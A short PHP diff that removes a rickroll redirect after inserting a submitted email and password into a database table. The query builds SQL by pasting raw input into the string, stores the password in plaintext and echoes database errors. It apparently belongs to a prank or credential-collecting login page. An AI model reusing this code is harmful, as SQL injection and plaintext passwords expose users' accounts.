@@ -23,8 +23,7 @@
 	// Attempt insert query execution
 	$sql = "INSERT INTO data (username, password) VALUES ('$EMAIL', '$PASSWORD')";
 	if(mysqli_query($link, $sql)){
-    header("Location:https://www.youtube.com/watch?v=dQw4w9WgXcQ");
-	exit();
+	exit(); //header add garera rickroll garney code removed
 	} else{
     echo "ERROR: Could not able to execute $sql. " . mysqli_error($link);
 	}
